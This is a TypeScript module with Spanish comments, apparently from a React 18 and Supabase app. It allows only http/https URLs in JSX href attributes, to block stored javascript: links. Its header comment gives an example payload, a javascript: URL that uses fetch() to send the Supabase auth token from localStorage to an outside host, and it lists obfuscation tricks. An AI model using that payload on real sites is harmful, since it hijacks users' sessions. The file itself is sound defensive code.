/**
 * Esquemas permitidos en una URL que viene de datos guardados.
 *
 * POR QUÉ: `sanitizeHtml.ts` cubre el HTML que se pinta con `dangerouslySetInnerHTML`, pero no
 * los `href={...}` de JSX — ahí no hay HTML que sanear: React escribe el atributo tal cual llegue.
 * Y **React 18 no filtra `javascript:` en producción**: la comprobación existe solo en
 * `react-dom.development.js` como un `console.error` ("A future version of React will block
 * javascript: URLs"), y en el bundle de producción el string ni siquiera aparece. (React 19 sí lo
 * bloquea; este proyecto está en 18.3, así que no hay red debajo.)
 *
 * Sin esto, un `javascript:fetch('https://…?s='+localStorage.getItem('sb-…-auth-token'))` guardado
 * como "URL del entregable" o como "Link del segmento" se ejecuta en el navegador de cualquiera
 * que lo clique —que es justo lo que se espera que haga con un enlace que dice "la landing"— con
 * su sesión de Supabase. Si la víctima es Estratega o Soporte, con ese token se gestiona el equipo.
 *
 * Igual que el saneamiento de HTML, esto se aplica en la **lectura**: cubre lo que ya esté
 * guardado en Supabase sin migrar nada.
 *
 * Se valida con `new URL()` a propósito, y no con una regex: el parser del navegador es el que
 * decide qué esquema tiene la cadena, así que ya se come los trucos de siempre —espacios y saltos
 * de línea en medio (`java\nscript:`), control characters al principio, mayúsculas—. Una regex
 * hecha a mano se los pierde.
 */

/** ¿Es una URL absoluta http/https? Lo que no parsea (relativa, vacía, basura) también es `false`:
 *  ninguno de los campos donde se usa esto admite una ruta relativa. */
export const esUrlHttp = (valor: string | null | undefined): boolean => {
  if (!valor) return false;
  try {
    const u = new URL(valor.trim());
    return u.protocol === 'http:' || u.protocol === 'https:';
  } catch {
    return false;
  }
};

/**
 * Para usar directo en `href={hrefSeguro(valor)}`. Devuelve `undefined` cuando el valor no es
 * http/https, y React entonces **omite el atributo**: el elemento se sigue viendo y el texto se
 * sigue leyendo, pero deja de ser un enlace clicable.
 *
 * Quien pinte esto debería además no dibujarlo como enlace (ver `DeliverableSummary`), para que no
 * quede un texto azul y subrayado que no hace nada.
 */
export const hrefSeguro = (valor: string | null | undefined): string | undefined =>
  esUrlHttp(valor) ? valor!.trim() : undefined;
